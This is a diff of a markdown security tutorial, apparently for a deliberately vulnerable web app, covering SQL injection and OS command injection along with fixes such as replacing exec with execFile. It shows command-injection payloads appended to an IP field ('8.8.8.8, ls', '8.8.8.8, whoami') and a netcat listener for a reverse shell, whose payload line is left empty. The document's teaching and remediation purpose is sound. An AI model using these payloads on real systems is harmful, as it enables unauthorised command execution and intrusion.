@@ -1,4 +1,5 @@
-# Exploiting error based SQL injection
+# sql Injection
+## Exploiting error based SQL injection
 
 ### Get the result of first user without knowing any user name with sqli
 ```
@@ -12,6 +13,8 @@
 
 
 ## The fix
+
+### Edits to the `core\appHandler.js`
 
 ```js
 module.exports.userSearch = function (req, res) {
@@ -49,4 +52,47 @@ module.exports.userSearch = function (req, res) {
 	})
 }
 ```
+
+
+---
+
+# OS Command Injection
+
+## Exploiting
+##### Intended behaviour
+```
+Enter a valid IP
+8.8.8.8
+```
+##### Exploiting by appending a OS command 
+```
+# List the files
+8.8.8.8, ls
+
+# Get the effective username of the current user when invoked
+8.8.8.8, whoami
+```
+
+##### Getting a reverse shell
+```
+# Start a listener on your public IP
+nc -nlvp 4444
+
+# Run the following in vulnerable app function
+8.8.8.8, 
+```
+
+### The fix
+### Edits to the `core\appHandler.js`
+
+```js
+// Remove the following line or replace 'exec' with 'execFile'
+const exec = require('child_process').exec;
+
+// Add the follwing line 
+const execFile = require('child_process').execFile;
+```
+
+
+
 
